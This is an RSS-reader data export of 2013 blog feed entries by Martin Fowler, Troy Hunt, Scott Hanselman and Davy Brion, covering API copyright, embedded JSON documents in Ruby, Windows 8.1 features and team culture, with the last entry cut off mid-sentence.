{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/API_Copyright.html","title":"Bliki: API_Copyright","published":{"$wrap":"$date","v":1370011320000,"h":"2013-05-31T14:42:00.000Z"},"starred":false,"read":false,"content":"<p>Yesterday the Electronic Frontier Foundation<a href=\"https://www.eff.org/press/releases/computer-scientists-urge-court-block-copyright-claims-oracle-v-google-api-fight\">released an amicusbrief</a>for a lawsuit on the topic of copyrighting APIs. The brief isa statement on behalf programmers who oppose the copyrighting ofAPIs. I'm one of the signatories to the amicus brief.</p><p>The software industry has long had a complicated relationship withintellectual property law. It's long been held that source code canbe protected by copyright, preventing someone from just copyingsomeone else's program without their consent. On the whole I'm infavor of using copyright in this way - as one who writes a lot ofprose describing software development, the mechanism seems to fitwell.</p><p>But that fit breaks down when it comes to interfaces of softwarecomponents. The whole point of components, as I see it, is that theyrepresent software elements that are independently replaceable andupgradeable<a href=\"#footnote-component\">[1]</a>. Breaking down softwaresystems into components allows competition to develop, as differentgroups compete with better or cheaper components. For this to work,components need to have common interfaces, which raises the questionof how such interfaces can develop.</p><p>So far common interfaces mostly appear by interfaces becomingwidely used and then widely copied. This can be intentionally, withcomponent authors documenting their interfaces, orby reverse engineering of closed interfaces. Reverse engineering ofclosed interfaces has played a vital role in the development ofsoftware systems we use today - the amicus brief describes examplessuch as various elements of Unix, the BIOS of the IBM PC, and theSMB protocol for network sharing of hard drives.</p><p>This background was challenged recently<a href=\"http://en.wikipedia.org/wiki/Oracle_v._Google\">by a case</a>brought by Oracle against Google's use of Java for Android. Thereare<a href=\"http://arstechnica.com/series/series-oracle-v-google/\">a number ofparts to this case</a>, but a key question was whether the API tocore java libraries was copyrightable. Last year a<a href=\"http://arstechnica.com/tech-policy/2012/05/google-wins-crucial-api-ruling-oracles-case-decimated/\">federaldistrict court ruled</a>that APIs were not copyrightable. Oracle isappealing against this, the amicus brief that we signed wasorganized by the EFF to uphold the district court's ruling.</p><p>I am not opposed to intellectual property in general, or the useof copyright for software. I do think it's reasonable for softwaredevelopers to be able to protect their hard work through the courseof an admittedly imperfect legal system. Nor do I deny thatdesigning a good API is significant intellectual work. But likeeverything else in property law, it's about balancing interests.Copyrightable APIs would erect considerable barriers to innovationand competition, further limiting the ability of new entrants todisrupt markets and improve the software ecosystem. This threat isnot a small one, and I'm happy to play a small part in opposingit.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-component\"><p><span class=\"num\">1:</span>I took this definition from Ralph Johnson</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1187}}
{"k":"0000000084","o":"0000000434","v":"001"}
{"_id":1188,"_uid":1188,"_dt":1373742620956,"_s":"ed5ea693204cd51a4a586d94ec05f79e"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/photos/46.html","title":"photostream 46","published":{"$wrap":"$date","v":1369143240000,"h":"2013-05-21T13:34:00.000Z"},"starred":false,"read":false,"content":"<p><a href = 'http://martinfowler.com/photos/46.html'><img src = 'http://martinfowler.com/photos/46.jpg'></img></a></p><p></p><p>Longwood Gardens, PA</p>","author":false,"_id":{"$wrap":"$oid","v":1188}}
{"k":"0000000084","o":"0000002067","v":"001"}
{"_id":1189,"_uid":1189,"_dt":1373742620956,"_s":"407afcca566d556a5c4a5eab8e0bca02"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/OIygwkMpIxk/video-hack-yourself-first-and-other.html","title":"Video: “Hack Yourself First” and other security tips for web developers","published":{"$wrap":"$date","v":1372151340001,"h":"2013-06-25T09:09:00.001Z"},"starred":false,"read":false,"content":"<p>A little while back I wrote about<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hacking yourself first</a>and detailed a bunch of different ways for developers to seek out risks in their own apps, hopefully before attackers find them first. I’m extremely enthusiastic about this approach and believe that developers need to hone cyber-offence skills in order to properly understand – and protect their apps from – risks on the web. There’s a heap more content coming from me along these lines in a variety of formats and today it’s a free video discussion on<a href=\"http://tv.ssw.com/3780/hack-yourself-first-and-other-security-tips-for-web-developers\">SSW TV</a>.</p><p>These guys do a bunch of great videos on various development topics that are up on their website for free, even including my user group talk on<a href=\"http://www.troyhunt.com/2012/03/ssw-tv-protecting-your-web-apps-from.html\">Protecting your web apps from the tyranny of evil with OWASP recorded last year</a>(effectively walking through the OWASP Top 10 for ASP.NET). Today’s video is a chat with SSW’s<a href=\"http://blog.damianbrady.com.au/\">Damian Brady</a>and we touch on a heap of different issues related to the web, ASP.NET and security in general. It’s a casual, unscripted discussion that hopefully contains some useful info for the security-conscious developer.</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/I6uKwdwQGhg?feature=player_embedded\" frameborder=\"0\" allowfullscreen=\"\"></iframe><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/OIygwkMpIxk\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1189}}
{"k":"0000000084","o":"0000000619","v":"001"}
{"_id":1190,"_uid":1190,"_dt":1373742620956,"_s":"d117b5d7be50a3dad8a2a827d55b3352"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/snips/201305300909.html","title":"Apple's next connector?","published":{"$wrap":"$date","v":1369919340000,"h":"2013-05-30T13:09:00.000Z"},"starred":false,"read":false,"content":"<p>A couple of years ago, Apple computers started appearing with a“Thunderbolt” interface to connect to monitors and disks. Some time after that, new iPhones appeared with a smaller connector called“Lightning”. Should we thus conclude that Apple’s next connector will be called“Very, Very Frightening”?</p>","author":false,"_id":{"$wrap":"$oid","v":1190}}
{"k":"0000000084","o":"0000006307","v":"001"}
{"_id":1191,"_uid":1191,"_dt":1373742620956,"_s":"c97050963c69745e4c1e1a653362e736"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/EmbeddedDocument.html","title":"Bliki: EmbeddedDocument","published":{"$wrap":"$date","v":1370356380000,"h":"2013-06-04T14:33:00.000Z"},"starred":false,"read":false,"content":"<p>Flowing JSON data structures through a server is something I'mseeing more these days. JSON documents can be persisted directly,either by using an<a href=\"http://martinfowler.com/bliki/AggregateOrientedDatabase.html\">AggregateOrientedDatabase</a>or a<a href=\"/eaaCatalog/serializedLOB.html\">serialized LOB</a>ina relational database. JSON documents can also be served directlyto web browsers or used to transfer data to server-side pagerenderers. When JSON is being used in this way, I hear people sayingthat using an object-oriented language gets in the way because theJSON needs to be translated into objects only to be rendered outagain - a waste of programming effort<a href=\"#footnote-effort\">[1]</a>. I agreewith the point about waste, but I argue that it's not a problem with objects buta failure to understand encapsulation.</p><p>Let's imagine we're storing an order as a JSON document andserving it up with minor server-side processing, again as JSON. Anexample document might be like this.</p><pre>{ \"id\": 1234,\"customer\": \"martin\",\"items\": [{\"product\": \"talisker\", \"quantity\": 500},{\"product\": \"macallan\", \"quantity\": 800},{\"product\": \"ledaig\",   \"quantity\": 1100}],\"deliveries\": [{ \"id\": 7722,\"shipDate\": \"2013-04-19\",\"items\": [{\"product\": \"talisker\", \"quantity\": 300},{\"product\": \"ledaig\",   \"quantity\": 500}]},{ \"id\": 6533,\"shipDate\": \"2013-04-18\",\"items\": [{\"product\": \"talisker\", \"quantity\": 200},{\"product\": \"ledaig\",   \"quantity\": 300},{\"product\": \"macallan\", \"quantity\": 300}]}]}</pre><p>We'll assume we haven't got much server-side processing to do, but we do havesome. Let's also assume we're using an OO language. A naive approachmight be to read in the JSON document, convert the data to theappropriate object graph (with orders, line-items, and deliveries),apply any processing, and then serialize the object graph to JSONfor the client.</p><p>In many of these situtiations a better way to proceed is to keepthe data in a JSONish form, but still wrap it with objects tocoordinate manipulation. Most programming environments providegeneric libraries that take a document and deserialize it to genericdata structures. So a JSON document would deserialize to a structureof lists and dictionaries, an xml document to a tree of xml nodes.We can then take this generic data structure and put it into a fieldof an order object - here's an example with Ruby and JSON.</p><pre>class Order...def initialize jsonDocument@data = JSON.parse(jsonDocument)end</pre><p>When we want to manipulate the data, we can define methods on theobject as usual, and implement them by accessing this data structre.</p><pre>class Order...def customer@data['customer']enddef quantity_for aProductitem = @data['items'].detect{|i| aProduct == i['product']}return item ? item['quantity'] : 0end</pre><p>This includes cases with more complex logic.<a href=\"#footnote-collection-lambda\">[2]</a></p><pre>class Order...def outstanding_delivery_for aProductdelivered_amount = @data['deliveries'].map{|d| d['items']}.flatten.select{|d| aProduct == d['product']}.inject(0){|res, d| res += d['quantity']}return quantity_for(aProduct) - delivered_amountend</pre><p>The embedded document can be enriched before sending to the client.</p><pre>class Order...def enrich@data['earliestShipDate'] =@data['deliveries'].map{|d| Date.parse(d['shipDate'])}.min.to_send</pre><p>If needed, you can form similar objects on sub-trees of theembedded document.</p><pre>class Order...def deliveries@data['deliveries'].map{|d| Delivery.new(d)}end</pre><pre>class Delivery...def initialize hash@data = hashenddef ship_dateDate.parse(@data['shipDate'])end</pre><p>One thing be wary of here is that such object wrappers aren'tquite the same as normal objects. The delivery objects returned inthe above code fragment don't have the same equality semantics thatyou'd expect from objects arranged in the more usual structure.</p><p>Despite its compartive rareity, an embedded document fits wellwith object-orientation. The point of encapsulated data is thehiding of the data structure, so that users of the object don't know or care aboutthe internal structure of the order.</p><p>Those familiar with functional programming will recognize thestyle of flowing a generic data structure through a series offunctions - you can think of the object as providing a namespace formanipulating the generic data stuctures.</p><p>The sweet spot for an embedded document is when you're providingthe document in the same form that you get it from the data store,but still want to do some manipulation of that data. If you don'thave any need to access the contents of the JSON document, thenthere's no need to even deserialize it into a generic datastructure. The order object needs only a constructor and a method toreturn its JSON representaiton. On the other hand as you do morework on the data - more server side logic, transforming intodifferent representations - then it's worth considering whether it'seasier to turn the data into an object graph.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-effort\"><p><span class=\"num\">1:</span>Some might argue it's a waste of computing effort too - althoughI would be surprised if it were significant. I would certainlynot accept a performance argument against converting to anobject graph unless it was accompanied by measurements - justlike<a href=\"/ieeeSoftware/yetOptimization.pdf\">any performance argument</a>.</p></div><div class=\"footnote-list-item\" id=\"footnote-collection-lambda\"><p><span class=\"num\">2:</span>Note the chaining of<a href=\"http://martinfowler.com/bliki/CollectionLambda.html\">CollectionLambdas</a>in thismethod. One of my pet annoyances is hearing some functional fanssay that this style of code isn't object-oriented. While it mayseem foreign to those with a C++/Java background, this style isperfectly natural to smalltalkers.</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1191}}
{"k":"0000000084","o":"0000000893","v":"001"}
{"_id":1192,"_uid":1192,"_dt":1373742620957,"_s":"e93a381eccdc3bfc8d7dfbfcc419ae00"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/articles/dipInTheWild.html","title":"DIP in the Wild","published":{"$wrap":"$date","v":1367424780000,"h":"2013-05-01T16:13:00.000Z"},"starred":false,"read":false,"content":"<div class = 'img'><img src = 'http://martinfowler.com/articles/DipInTheWild/images/BrettSchuchert.jpg' width = '75' height = '' alt = '' title = ''/></div><p>The Dependency Inversion Principle (DIP) was coined by (Uncle) Bob Martin several years ago. It’s a useful principle to help organize the dependencies in your system. Here<a href='http://schuchert.wikispaces.com/'>Brett Schuchert</a>shows<a href='http://martinfowler.com/articles/dipInTheWild.html'>how this principle works in practice</a>to simplify designs with a couple of real world examples from his recent ThoughtWorks projects.</p>","author":false,"_id":{"$wrap":"$oid","v":1192}}
{"k":"0000000084","o":"0000001082","v":"001"}
{"_id":1193,"_uid":1193,"_dt":1373742620957,"_s":"96a0b2e0ba3461c767b9570a2ea62063"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://www.thoughtworks.com/radar","title":"May 2013 edition of ThoughtWorks Technology Radar","published":{"$wrap":"$date","v":1369254900000,"h":"2013-05-22T20:35:00.000Z"},"starred":false,"read":false,"content":"<div class = 'img'><img src = 'http://martinfowler.com/snips/radar-0513.png' width = '75' height = '' alt = '' title = ''/></div><p>The<a href='http://martinfowler.com/articles/radar-faq.html#tab'>ThoughtWorks Technology Advisory Board (TAB)</a>has released the latest edition of our<a href='http://www.thoughtworks.com/radar'>technology radar</a>. This is where we highlight some of the technologies that are currently attracting our attention and that we feel are worth you taking a look at. In this edition our themes include my long term interest in breaking down boundaries between people and groups, lightweight option for analytics, infrastructure as code, and applying the practices that have worked well for us in development to places that are missing them.</p>","author":false,"_id":{"$wrap":"$oid","v":1193}}
{"k":"0000000084","o":"0000013455","v":"001"}
{"_id":1194,"_uid":1194,"_dt":1373742620957,"_s":"18b329fa10f244b96d1fbe8d80ec8a9c"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42773271/0/scotthanselman~New-Features-in-Windows-Preview-that-saved-my-Surface-RT.aspx","title":"10 New Features in Windows 8.1 Preview that saved my Surface RT","published":{"$wrap":"$date","v":1372316942000,"h":"2013-06-27T07:09:02.000Z"},"starred":false,"read":false,"content":"<div><p>I just bit the bullet and installed the Windows 8.1 Preview on my Surface RT. It's a one-way upgrade (meaning you won't be able to go from this Preview Build to the final) so make a Recovery Drive with a USB drive you have lying around. You'll need at least a 4GB USB key for this backup and the drive will be erased. Then go to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~preview.windows.com\">http://preview.windows.com</a>and follow the instructions. Basically you download an update, install, reboot, and then the Windows Store says Windows 8.1 Preview is available. You install for a while (took a few hours) and assuming you're signed in with the same Microsoft Account it will redownload all your apps.</p><blockquote><p><strong>Warning</strong>: Installing anything called\"preview\"is for advanced/enthusiast folks. Expect nothing and you'll never be disappointed. Backup your crap. Be prepared to torch your machine to get back to the mainline.</p></blockquote><p>I honestly didn't use my Surface RT that much, mostly just for Movies and Stuff, but this new 8.1 update adds some stuff that will have me using it around the house more.</p><p>Here's 10 features that are making me look harder at Windows 8.1.</p><h3>Being able to use your Desktop Wallpaper as your Start Menu background</h3><p>The Start Button is back, down there in the corner. But that's not as interesting to me as the ability to use your Desktop wallpaper as your Start Menu background. This might be hard to visualize, but the point is that if you hit the Start Button (or the Windows Key) you'll immediately move to the big Start Menu. When the background of that menu is your same desktop wallpaper, the result is much less jarring than a bright background and makes the whole Windows 8.x experience much more comforting.</p><p><img title=\"Windows 8.1\"style=\"display: inline\"alt=\"Windows 8.1\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(1)_3.png\"width=\"720\"height=\"405\"></p><p><img title=\"Using the Desktop Wallpaper as my Start Screen background\"style=\"display: inline\"alt=\"Using the Desktop Wallpaper as my Start Screen background\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(2)_3.png\"width=\"720\"height=\"405\"></p><p>From the Start Menu, hit Windows-C, click Settings, then Personalization. You'll see the menu fly out as in the picture below. Select the tiny thumbnail of your wallpaper. It's the square with the birds in my picture here.</p><p><img title=\"Screenshot (5)\"style=\"display: inline\"alt=\"Screenshot (5)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(5)_9.png\"width=\"720\"height=\"405\"></p><p>This little change is a huge difference. I wish this was the default experience, myself.</p><h3>Search Everywhere</h3><p>If you are in the Start Screen and you start typing it will search everything. Apps, Files and the Internet if you want. If you search for a Well Known Thing (caps mine) then it will give you detailed results that include (possibly) music, big pics, videos, etc. I searched for Daft Punk below.</p><p><img title=\"Screenshot (3)\"style=\"display: inline\"alt=\"Screenshot (3)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(3)_3.png\"width=\"720\"height=\"405\"></p><h3>Freaking Outlook 2013</h3><p>Since my Surface RT includes Office RT (Word, Excel, PointPoint, etc) it looks like Windows 8.1 adds Outlook 2013 RT to the mix! This was a total surprise to me, and is the #1 reason I'll start using my Surface for work stuff. I'm surprised this hasn't been noticed by some of the tech sites I read. It's an awesome addition.</p><p><img title=\"Outlook 2013 RT\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Outlook 2013 RT\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(4)_3.png\"width=\"722\"height=\"407\"></p><h3>Smarter Windowing</h3><p>Windows 8.1 seems much smarter about making decisions about window management. Here I've launched the Games app while running the Mail app on the left and the Desktop on the right. it's hovering (teetering, even) in the middle, waiting to be pulled from one side to the other, rather than just taking over one of my existing apps.</p><p>Apps can be 50/50 split on the Surface RT, as well as the other 70/30 options.</p><p><img title=\"Screenshot (6)\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Screenshot (6)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(6)_3.png\"width=\"722\"height=\"407\"></p><h3>Way easier customization</h3><p>Icons are moved more like on my other tablets, with a push and hold gesture. Except you can select multiple icons, start dragging them with one figure while<em>scrolling with the other finger</em>. Grouping and customizing is way easier.</p><p>Here is me starting to move things around. I've got the Office stuff tiny, and the News app largest.</p><p> <img title=\"Moving my start screen around\"style=\"display: inline\"alt=\"Moving my start screen around\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(8)_3.png\"width=\"720\"height=\"405\"></p><h3>Better All Apps View</h3><p>Apps that are newly installed get marked\"new\"in the All Apps few. You swipe down from the Start Menu to get here, and can sort by Recently Installed as well. I found a bunch of new apps I hadn't seen before like Calculator, Sound Recorder, Health and Fitness and Alarms.</p><p><img title=\"All Apps View\"style=\"display: inline\"alt=\"All Apps View\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(9)_3.png\"width=\"720\"height=\"405\"></p><h3>More Comprehensive Settings</h3><p>The Settings area has a LOT more info than before, including some rather deep pages (you may have to hunt) like this one on my Wi-Fi Router. Note that it's marked as a Meter Connection. I thought it was cool that Outlook didn't connect automatically when this was marked as Metered (this means my router has limited data and I could be charged for big downloads). I have personally downloaded gigs of mail while overseas and gotten nailed by big bills, so this was cool.</p><p>The Metering is an existing feature, but the deeper details into my Wi-Fi and devices is new.</p><p><img title=\"Better Wi-Fi\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Better Wi-Fi\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(10)_3.png\"width=\"722\"height=\"407\"></p><h3>Removable Disks in your Music and Video Libraries</h3><p>I'm pretty sure this wasn't there before. I added a 64gig micro-SD to my Surface RT with the plan to watch Videos and store Photos on it, but it wasn't very seamless in Windows 8. I took a chance and right clicked on my SD card folders and said\"Include in Library\"and now my videos show up in the Videos app! Suddenly my 32-gig Surface has become a more useful 96 gig machine (well, 64-gig, as I'm going to change the defaults to store everything on my SD card.)</p><p><img title=\"Removeable disks in libraries\"style=\"display: inline\"alt=\"Removeable disks in libraries\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(11)_3.png\"width=\"720\"height=\"405\"></p><p>Here's my videos listed, some in the cloud and some on my micro SD card.</p><p><img title=\"My videos from the SD Card\"style=\"display: inline\"alt=\"My videos from the SD Card\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(12)_3.png\"width=\"720\"height=\"405\"></p><p>Here I am looking at Outlook while watching Harry Potter in Split-Screen.</p><p><img title=\"Outlook plus Harry Potter\"style=\"display: inline\"alt=\"Outlook plus Harry Potter\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(14)_3.png\"width=\"720\"height=\"405\"></p><h3>Smarter Notifications and Quiet Hours</h3><p>My wife is NOT a fan of my Surface RT for one basic reason. It won't stop beeping. I installed Twitter and Twitter\"pops toast\"- meaning, it uses notifications - and it's forever going off and beeping at night. Yes, I could turn off notifications, or sleep it, and I do, but when I'm using the thing I want it on. The Notifications options have been expanded to include\"quiet hours,\"which is a nice touch.</p><p><img title=\"Quiet Hours\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Quiet Hours\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(18)_3.png\"width=\"722\"height=\"407\"></p><h3>The Reading List</h3><p>I'm a big fan of Instapaper and the idea of a\"Read It Later\"gesture. This is different from simply bookmarking. This is a queue of long-form reading material. From apps like Internet Explorer you can invoke the\"Share\"action. I could share to Twitter, Mail, some People, or the new Reading List.</p><p><img title=\"Sharing to Reading List\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Sharing to Reading List\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(15)_3.png\"width=\"722\"height=\"407\"></p><p>Then I click to Share, and later on go to my Reading List (now pinned to my Start Screen) and go read my long form articles. I haven't checked but I'm presuming this list would be persisted transparently across all my machines.</p><p><img title=\"Reading from the Reading List\"style=\"display: inline\"alt=\"Reading from the Reading List\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(17)_3.png\"width=\"720\"height=\"405\"></p><hr><p><strong>Sponsor:</strong>Big thanks to CodeProject for sponsoring the feed this week! What you can do with 215+ million business records? Dig into the data in the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11ZEAS7\">D&B Developer Challenge and post an article on CodeProject about what you could do with the data</a>. Over $40,000 in prizes total are up for grabs.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/11ZEAS7\">Check it out</a>!<br/><hr/>©2013 Scott Hanselman. All rights reserved.<br/></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42773271/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42773271/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42773271/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42773271/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42773271/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42773271/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1194}}
{"k":"0000000084","o":"0000000646","v":"001"}
{"_id":1195,"_uid":1195,"_dt":1373742620957,"_s":"e407b446c29976434e29059e9c565704"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/snips/201307040927.html","title":"Speaking in South Africa","published":{"$wrap":"$date","v":1372944420000,"h":"2013-07-04T13:27:00.000Z"},"starred":false,"read":false,"content":"<p>Next month I’ll be travelling to South Africa again for the first time in over ten years. I’m going down to give a keynote at the<a href='http://agileafrica.jcse.org.za'>Agile Africa conference</a>in Johannesburg on August 12/13. I’ll also be popping down to Cape Town on Thursday 15th (details and links to follow when I have them).</p>","author":false,"_id":{"$wrap":"$oid","v":1195}}
{"k":"0000000084","o":"0000003314","v":"001"}
{"_id":1196,"_uid":1196,"_dt":1373742620958,"_s":"38a7348df3865739c618f251cf4602f4"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/ExtremeProgramming.html","title":"Bliki: ExtremeProgramming","published":{"$wrap":"$date","v":1373551800000,"h":"2013-07-11T14:10:00.000Z"},"starred":false,"read":false,"content":"<p>Extreme Programming (XP) is a software development methodologydeveloped primarily by<a href=\"https://twitter.com/KentBeck\">KentBeck</a>. XP was one of the first<a href=\"/articles/newMethodology.html\">agile methods</a>, indeed XP was thedominant agile method in the late 90s and early 00s before Scrumbecame dominant as the noughties passed. Many people (includingmyself) consider XP to be the primary catalyst that got attention toagile methods, and superior to Scrum as a base for starting out inagile development.</p><p>Kent developed XP over the course of his consulting to Smalltalkprojects in the late 80s and early 90s. The full set of practicesthat came to be known as XP were first used together in the<a href=\"http://martinfowler.com/bliki/C3.html\">C3</a>project (where I worked with Kent and learned aboutit). The name \"Extreme Programming\" came later as the approach wasdescribed, first informally on the<a href=\"http://c2.com/cgi/wiki?WikiWikiWeb\">WikiWikiWeb</a>and then later in a seriesof books. Various teams took the description in the WikiWikiWeb andimplemented XP themselves, thus replicating the methodology andshowing it could be used outside its original home.</p><p>Kent describes XP by a progression of ideas from broad andabstract values through principles, to concrete practices - aprogression that I find useful to apply in many other contexts. Itpopularized many practices that have since been widely used insoftware development, including:<a href=\"http://martinfowler.com/articles/continuousIntegration.html\">continuousintegration</a>,<a href=\"http://refactoring.com/\">refactoring</a>,<a href=\"http://martinfowler.com/bliki/TestDrivenDevelopment.html\">TestDrivenDevelopment</a>, and agile planning. I particularlylike its combination of technical and management practices, whichmake it a good fit for reaching<a href=\"/articles/agileFluency.html\">two-star agile fluency</a><a href=\"#footnote-flaccid-scrum\">[1]</a>.</p><p>Although, like most XPers, I don't think it's terribly useful tojudge a team on whether they are doing XP or not; I would say that mostThoughtWorks projects operate in a style that is primarily influencedby XP.</p><div class=\"furtherReading\"><h2>Further Reading</h2><p>The definitive description of Extreme Programming is<a href=\"http://www.amazon.com/gp/product/0321278658?ie=UTF8&tag=martinfowlerc-20&linkCode=as2&camp=1789&creative=9325&creativeASIN=0321278658\">Kent'swhite book</a><img src=\"http://www.assoc-amazon.com/e/ir?t=martinfowlerc-20&l=as2&o=1&a=0321601912\" width=\"1\" height=\"1\" border=\"0\" alt=\"\" style=\"border:none !important; margin:0px !important;\"/>.</p></div><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-flaccid-scrum\"><p><span class=\"num\">1:</span>a contrast to Scrum which intentionally only includes managementpractices, and is thus vulnerable to becoming<a href=\"http://martinfowler.com/bliki/FlaccidScrum.html\">FlaccidScrum</a></p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1196}}
{"k":"0000000084","o":"0000005683","v":"001"}
{"_id":1197,"_uid":1197,"_dt":1373742620958,"_s":"f5a34cd6448e02e5ffb90953e1ac30ce"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/vmRCqUkdXLU/","title":"Why Things Don’t Work In Your World","published":{"$wrap":"$date","v":1336935036000,"h":"2012-05-13T18:50:36.000Z"},"starred":false,"read":false,"content":"<p>A very common reaction for developers to have when they hear about new technical approaches or new approaches to team organization is \"yeah right, that won't work in the real world\" or \"that'll never work in our situation\". A lot of us have felt that way. I certainly have as well a few times in the past. The 2 most common excuses you'll hear for not believing something can work are:</p><ol><li><p>The people I work with aren't good/talented/disciplined enough to make this work.</p></li><li><p>It can't possibly work in our organization.</p></li></ol><p>The truth though, is that it's actually because of <em>you</em>. Whenever you say \"that won't work for us\" or something similar because of the people you work with, you immediately show your lack of faith in them. You might think that that lack of faith is justified, but that basically means you've given up all hope of making things better. You know it, and worst of all, <em>they know it too</em>. People who aren't trusted by their coworkers or superiors generally pick up on that rather quickly. Some of them will respond by putting in more effort and trying to do better. Others will become demotivated and wonder why they should even try because \"it's never good enough anyway\". At this point, your lack of trust in your coworkers becomes a self-fulfilling prophecy.</p><p>You might want to consider another approach. Think back on how you've responded to situations where you where challenged by coworkers or superiors but where it was clear that they trusted you and believed that you were capable of doing a better job. I'd bet that for most of you, it improved your motivation and your willingness to do better. It probably helped you bring out the best in you. You can use this to your advantage when you're trying to get better results out of your coworkers. It's quite simple really: it's all about how you approach someone. If you want somebody to do better, and you approach them in a positive manner you're much more likely to get better results. If however, they sense your distrust (and most people pick up on that quite easily), they will most likely be defensive or apprehensive. The odds are quite low that something good will come out of that.</p><p>If you want people to improve and do better, it's important to establish a culture where everybody knows that it's <em>ok</em> to make mistakes, and that every mistake is an opportunity for the whole team to get better. If that's not the case in your situation, what is preventing you from trying to get to that point? Even 